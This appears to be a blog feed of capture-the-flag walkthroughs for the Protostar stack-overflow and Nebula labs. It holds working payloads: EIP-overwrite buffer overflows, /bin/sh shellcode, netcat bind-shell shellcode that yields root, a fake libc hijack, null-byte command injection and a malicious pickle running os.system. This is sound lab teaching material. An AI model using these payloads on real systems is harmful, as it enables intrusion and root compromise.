<p><div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break main
Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
(gdb) run
Starting program: /opt/protostar/bin/stack4&lt;/p&gt;

&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
15      stack4/stack4.c: No such file or directory.
in stack4/stack4.c
(gdb) next
AAAA
16      in stack4/stack4.c
(gdb) info frame
Stack level 0, frame at 0xbffff7d0:
eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
source language c.
Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
Locals at 0xbffff7c8, Previous frame’s sp is 0xbffff7d0
Saved registers:
ebp at 0xbffff7c8, eip at 0xbffff7cc
(gdb) x/32xw $esp
0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
(gdb) p 0xbffff7cc - 0xbffff780
= 76
(gdb) info address win
Symbol “win” is a function at address 0x80483f4.</code></pre></div></p>

<ul>
  <li><code>info frame</code>: Shows the normal location of the saved instruction pointer, <code>eip</code>: <code>0xb7eacc76</code>.</li>
  <li><code>x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code>0xbffff780</code> with <code>0x414141</code> (AAAA).</li>
  <li><code>p 0xbffff7cc - 0xbffff780</code>: Calculates <code>&amp;eip - &amp;buffer</code>, giving an offset to eip.
Using the offset calculated above, <code>eip</code> is redirected to the address of <code>win()</code> function.</li>
</ul>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -e “<span class="k">$(</span>perl -e “print ‘A’x76”<span class="k">)</span><span class="se">\x</span>f4<span class="se">\x</span>83<span class="se">\x</span>04<span class="se">\x</span>08” <span class="p">|</span> ./stack4
<span class="go">code flow successfully changed</span>
<span class="go">Segmentation fault</span></code></pre></div></p>

<h2 id="stack-level-5">Stack: Level 5</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code>stack5</code>.</p>

<h3 id="utilities">Utilities</h3>

<p><code>~/nop</code>:
<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/perl</span>
<span class="c1"># Prints argv[0] number of NOP instructions to stdout</span>
<span class="k">print</span> <span class="err">“</span><span class="o">\</span><span class="n">x90</span><span class="err">”</span><span class="n">x</span><span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span></code></pre></div></p>

<p><code>~/envaddr.c</code>:
<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Prints the approximate address of an environmental variable</span>
<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;&lt;/stdlib.h&gt;&lt;/stdio.h&gt;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span> <span class="n">not</span> <span class="n">found</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span> <span class="n">is</span> <span class="n">at</span> <span class="n">address</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></div></p>

<p>These utilities will be used in future solutions as well.</p>

<h3 id="solution">Solution</h3>

<h4 id="overview-1">Overview</h4>
<p>From a high level, this is our approach:
1. Store the shellcode in an environmental variable.
2. Find the approximate address of the environmental variable on the stack.
3. Overwriting the return address in <code>stack5</code> with the address of the environmental variable, we execute the shellcode.</p>

<p>There are various ways to execute shellcode, but it’s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it’s larger than the buffer (64 bytes).</p>

<h4 id="executing-binsh">Executing <code>/bin/sh</code></h4>
<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code>/bin//sh -sli</code>.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>

<span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x68732f2f</span>   <span class="c1">; chars for /bin//sh</span>
<span class="nf">push</span> <span class="mh">0x6e69622f</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>

<span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x736c692d</span>   <span class="c1">; -sli flags</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div></p>

<p>We’ll overwrite the return address with the address of our shellcode environmental variable.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="k">$(</span>~/nop 100<span class="k">)$(</span>cat /home/user/shell<span class="k">))</span>
<span class="gp">$</span> ~/envaddr SC
<span class="go">SC is at address 0xbffffefa</span>
<span class="gp">$</span> <span class="nb">echo</span> -n <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>fa<span class="se">\x</span>fe<span class="se">\x</span>ff<span class="se">\x</span>bf”x25’<span class="k">)</span> <span class="p">|</span> /opt/protostar/bin/stack5</code></pre></div></p>

<p>Nothing happened! Let’s take a look with GDB.</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">[user@protostar:~]$ echo -n $(perl -e ‘print “\xfa\xfe\xff\xbf”x25’) &amp;gt; /tmp/sc-shell
[user@protostar:~]$ gdb /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5…done.
(gdb) run &amp;lt; /tmp/sc-shell
Starting program: /opt/protostar/bin/stack5 &amp;lt; /tmp/sc-shell
Executing new program: /bin/dash&lt;/p&gt;

&lt;p&gt;Program exited normally.</code></pre></div></p>

<p>The shell opens, but it exits immediately. The shellcode is executing, but there’s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>

<h4 id="opening-a-shell-through-netcat">Opening a shell through netcat</h4>
<p>We know that our shellcode does run, but it can’t open a shell. However, there are a wide a wide array of exploits available besides running <code>/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We’ll use the netcat solution.</p>

<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne “<span class="se">\x</span>eb<span class="se">\x</span>2a<span class="se">\x</span>5e<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>88<span class="se">\x</span>46<span class="se">\x</span>07<span class="se">\x</span>88<span class="se">\x</span>46<span class="se">\x</span>0f<span class="se">\x</span>88<span class="se">\x</span>46<span class="se">\x</span>19<span class="se">\x</span>89<span class="se">\x</span>76<span class="se">\x</span>1a<span class="se">\x</span>8d<span class="se">\x</span>5e<span class="se">\x</span>08<span class="se">\x</span>89<span class="se">\x</span>5e<span class="se">\x</span>1e<span class="se">\x</span>8d<span class="se">\x</span>5e<span class="se">\x</span>10<span class="se">\x</span>89<span class="se">\x</span>5e<span class="se">\x</span>22<span class="se">\x</span>89<span class="se">\x</span>46<span class="se">\x</span>26<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>89<span class="se">\x</span>f3<span class="se">\x</span>8d<span class="se">\x</span>4e<span class="se">\x</span>1a<span class="se">\x</span>8d<span class="se">\x</span>56<span class="se">\x</span>26<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>e8<span class="se">\x</span>d1<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>6e<span class="se">\x</span>63<span class="se">\x</span>23<span class="se">\x</span>2d<span class="se">\x</span>6c<span class="se">\x</span>70<span class="se">\x</span>38<span class="se">\x</span>30<span class="se">\x</span>38<span class="se">\x</span>30<span class="se">\x</span>23<span class="se">\x</span>2d<span class="se">\x</span>65<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>23” <span class="p">&amp;</span>gt<span class="p">;</span> ~/sc-nc-8080
<span class="gp">$</span> <span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -ne <span class="k">$(</span>~/nop 100<span class="k">)$(</span>cat /home/user/sc-nc-8080<span class="k">))</span>
<span class="gp">$</span> ~/envaddr SC
<span class="go">SC is at address 0xbffffece</span>
<span class="gp">$</span> <span class="nb">echo</span> -n <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>ce<span class="se">\x</span>fe<span class="se">\x</span>ff<span class="se">\x</span>bf”x25’<span class="k">)</span> <span class="p">|</span> /opt/protostar/bin/stack5&lt;/p&gt;
<span class="go">&lt;waiting&gt;</span></code></pre></div>

On another machine, complete the newly waiting connection:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami</span>
<span class="go">root</span></code></pre></div>
</waiting>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
    <updated>2012-08-18 00:00:00 -0700</updated>
    <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels.</p>

<p>This is the first of three posts for Stack. The first four levels are straightforward, and their corresponding posts contain little explanation (solutions). The last three levels have more potential pitfalls, and those posts contain more detailed explanations (walkthroughs).</p>

<h1 id="solutions">Solutions</h1>
<p>## Stack: Level 0
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> perl -e “print ‘a’x65” <span class="p">|</span> ./stack0
<span class="go">you have changed the ‘modified’ variable</span></code></pre></div></p>

<h2 id="stack-level-1">Stack: Level 1</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./stack1 <span class="k">$(</span>perl -e “print ‘a’x64 . dcba”<span class="k">)</span>
<span class="go">you have correctly got the variable to the right value</span></code></pre></div></p>

<!-- more -->
<p>## Stack: Level 2
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack2">full</a>): Overwrite a variable by using an environmental variable.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -e “<span class="k">$(</span>perl -e “print ax64”<span class="k">)</span><span class="se">\n\r\n\r</span>”<span class="k">)</span>
<span class="gp">$</span> ./stack2
<span class="go">you have correctly modified the variable</span></code></pre></div></p>

<h2 id="stack-level-3">Stack: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack3">full</a>): Overwrite a function pointer.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -d ./stack3 <span class="p">|</span> grep win
<span class="go">08048424 &lt;win&gt;:</span>
<span class="gp">$</span> <span class="nb">echo</span> -e <span class="s2">&quot;$(perl -e &quot;</span>print <span class="s1">&#39;a&#39;</span>x64<span class="s2">&quot;)\x24\x84\x04\x08&quot;</span> <span class="p">|</span> ./stack3
<span class="go">calling function pointer, jumping to 08048424</span>
<span class="go">code flow successfully changed</span></code></pre></div></win></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 15-19)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/17/nebula2/"/>
    <updated>2012-08-17 00:00:00 -0700</updated>
    <id>http://louisrli.github.io/blog/2012/08/17/nebula2</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 – I was distracted by some other projects.</p>

<h2 id="level-15">Level 15</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> strace /home/flag15/flag15 2<span class="p">&amp;</span>gt<span class="p">;&amp;</span>amp<span class="p">;</span><span class="m">1</span> <span class="p">|</span> less
<span class="go">…</span>
<span class="go">stat64(“/var/tmp/flag15/tls/i686/sse2/cmov”, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
<span class="go">open(“/var/tmp/flag15/tls/i686/sse2/libc.so.6”, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
<span class="go">stat64(“/var/tmp/flag15/tls/i686/sse2”, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
<span class="go">open(“/var/tmp/flag15/tls/i686/cmov/libc.so.6”, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
<span class="go">stat64(“/var/tmp/flag15/tls/i686/cmov”, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
<span class="go">open(“/var/tmp/flag15/tls/i686/libc.so.6”, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)</span>
<span class="go">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000</span>
<span class="go">access(“/etc/ld.so.preload”, R_OK)      = -1 ENOENT (No such file or directory)</span>
<span class="go">open(“/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6”, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
<span class="go">stat64(“/var/tmp/flag15/tls/i686/sse2/cmov”, 0xbfc25f24) = -1 ENOENT (No such file or directory)</span>
<span class="go">…</span></code></pre></div></p>

<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn’t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>

<!-- more -->
<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /home/level15/flag.sh</span>
getflag <span class="p">&amp;</span>gt<span class="p">;</span> /home/flag15/getflag.log</code></pre></div></p>

<p><br />
<code>~/version</code>: preventing an error about requiring <code>GLIBC_2.0</code>:
<div class="highlight"><pre><code class="language-text" data-lang="text">GLIBC_2.0 { };</code></pre></div></p>

<p><br />
<code>~/run.sh</code>: A makeshift Makefile that also executes our code.
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash -ex</span>
<span class="c"># run.sh</span>
gcc -fPIC -g -c -Wall getflag.c
gcc -shared -Wl,-Bstatic,-soname,libc.so.6,–version-script,version -o libc.so.6 getflag.o  -L/usr/lib/i386-linux-gnu -static-libgcc
mv /home/level15/libc.so.6 /var/tmp/flag15/
/home/flag15/flag15
cat /home/flag15/getflag.log</code></pre></div></p>

<p><br />
<code>~/getflag.c</code>: another interpretation of “libc,” but it happens to call <code>execv</code>.
<div class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &amp;lt;sys/syscall.h&amp;gt;</span>
<span class="cp">#include &lt;unistd.h&gt;&lt;/unistd.h&gt;&lt;/stdio.h&gt;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// If this isn’t here, we have an error about a missing symbol</span>
<span class="kt">void</span> <span class="n">__cxa_finalize</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib—libc-start-main-.html</span>
<span class="kt">int</span> <span class="n">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">args_new</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">level15</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">sh</span><span class="err">”</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span> <span class="n">args_new</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./run.sh
<span class="go">You have successfully executed getflag on a target account</span></code></pre></div>
## Level 16 ##
<strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code>egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>

<p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>

<p>There are two parts to the solution:</p>

<ol>
  <li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code>/tmp/RUN/</code> (our script) as <code>/*/RUN</code>.</li>
  <li>The Perl string doesn’t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code>"</code>, “<code>\</code><code>", and </code>%00`. The last one is the null character in a URL.</li>
</ol>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /home/level16/curl</span>
<span class="nb">echo</span> <span class="nv">$1</span>  <span class="c"># sanity check</span>
<span class="nv">url</span><span class="o">=</span>”http://localhost:1616/index.cgi?username<span class="o">=</span><span class="nv">$1</span><span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">password</span><span class="o">=</span>foo”
<span class="nb">echo</span> <span class="nv">$uri</span>
curl –globoff <span class="nv">$3</span> “<span class="nv">$uri</span>”
ls /home/flag16 <span class="p">|</span> grep getflag.log</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># /tmp/RUN</span>
getflag <span class="p">&amp;</span>gt<span class="p">;</span> /home/flag16/getflag.log</code></pre></div></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/curl ‘ “&lt;code&gt;/*/RUN&lt;/code&gt; %00 ‘
<span class="gp">$</span> cat /home/flag16/getflag.log
<span class="go">You have successfully executed getflag on a target account</span></code></pre></div></p>

<h2 id="level-17">Level 17</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>

<p>The vulnerability of the Python <code>pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>

<blockquote>
  <p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p>
</blockquote>

<p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>

<p>Our pickled “data” goes in <code>~/cmd</code>:</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">cos
system
(S’ /tmp/run17’
tR.</code></pre></div></p>

<p>We send the pickled data to the listening script.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat /tmp/run17
<span class="gp">#</span>!/bin/bash
<span class="go">getflag &amp;gt; /home/flag17/getflag.log</span>
<span class="gp">$</span> cat cmd <span class="p">|</span> nc localhost 10007
<span class="go">Accepted connection from 127.0.0.1:56228^C</span>
<span class="gp">$</span> cat /home/flag17/getflag.log
<span class="go">You have successfully executed getflag on a target account</span></code></pre></div></p>

<h3 id="interpreting-pickled-data">Interpreting Pickled data</h3>
<p>I was curious about the parts of the malicious pickle. I searched first for the <code>pickle</code> format specification, but I wasn’t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>

<blockquote>
  <p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple…</p>
</blockquote>

<h2 id="level-18">Level 18</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code>flag18</code> is a program that mimics a login shell with various options such as <code>login</code>, <code>logout</code>, <code>shell</code> (see full description). The flag directory contains an unreadable password file.</p>

<h3 id="discussion">Discussion</h3>
<p>This problem was more complex than the others, given the number of options provided initially.</p>

<p>There are flags on <code>flag19</code> for a debug file and a verbose level. Using <code>-d /dev/tty</code> saves us some effort.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> /home/flag19/flag19 -d /dev/tty -vvvvv
<span class="go">login</span>
<span class="go">got [login] as input</span>
<span class="go">attempting to login</span></code></pre></div></p>

<p>If we iterate through the possible commands, we can rule out some paths.</p>

<ul>
  <li>There’s no apparent path for dumping the contents of the password file through the code.</li>
  <li>The <code>notsupported()</code> and <code>setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
</ul>

<p>We can confirm this by trying playing around with buffer overflows and format strings:</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">site exec %s%s%s%s%s  # notsupported() -&amp;gt; prints some of the stack
site exec %n  # notsupported() -&amp;gt; fails with &lt;em&gt;** %n in writable segment detected **&lt;/em&gt;
setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&amp;gt; exits immediately, detecting buffer overflow</code></pre></div></p>

<h3 id="solution">Solution</h3>

<p><code>if(fp)</code> will fail if the file can’t be opened for any reason. Since the files opened by <code>login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code>fp</code> will then be <code>NULL</code> once the maximum number is reached. Finally, we use <code>closelog</code> to free a file descriptor.</p>

<p>If <code>closelog</code> isn’t called, <code>execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code>libncurses.so.5</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">1</span> 2000<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> “login foo” » ~/flood<span class="p">;</span> <span class="k">done</span>
<span class="gp">$</span> <span class="nb">echo</span> “closelog” » ~/flood
<span class="gp">$</span> <span class="nb">echo</span> “shell” » ~/flood
<span class="gp">$</span> <span class="nb">echo</span> “getflag <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/getflag.log” <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/getflag <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> chmod a+x /tmp/getflag</code></pre></div></p>

<p>The initial attempt looks like this:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">cd</span> /home/flag18/
<span class="gp">$</span> cat ~/flood <span class="p">|</span> ./flag18 -d /dev/tty
<span class="go">…</span>
<span class="go">/home/flag18/flag18: -d: invalid option</span></code></pre></div></p>

<p><code>sh</code> doesn’t have a <code>-d</code> flag. The author left a hint to look at the options in the man page; <code>sh</code> needs an option that ignores the input afterwards.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> cat ~/flood <span class="p">|</span> ./flag18 –init-file /tmp/getflag -d /dev/tty</code></pre></div></p>

<p>This actually opens a promptless shell reading from stdin.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">…</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">logged in successfully (without password file)</span>
<span class="go">whoami</span>
<span class="go">flag18</span>
<span class="go">cat /home/flag18/password</span>
<span class="go">44226113-d394-4f46-9406-91888128e27a</span>
<span class="go">getflag</span>
<span class="go">You have successfully executed getflag on a target account</span></code></pre></div></p>

